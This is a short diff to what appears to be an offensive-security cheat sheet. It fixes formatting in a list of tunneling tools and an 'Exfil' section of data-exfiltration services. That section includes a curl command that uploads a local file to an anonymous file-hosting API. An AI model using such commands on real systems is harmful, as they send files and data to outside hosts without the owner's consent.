@@ -1468,7 +1468,7 @@ Tunneling
 1. [ngrok](https://ngrok.com/download), [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps) or [pagekite](https://pagekite.net/) to make a server behind NAT accessible from the public Internet.
 
 Exfil
-1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l / blitz foo.txt`
+1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
 1. [Mega](https://mega.io/cmd)
 1. ~~[BashUpload](https://bashupload.com/)~~
 2. [AnonFiles](https://www.anonfiles.com) - `curl -F "file=@test.txt" https://api.anonfiles.com/upload`
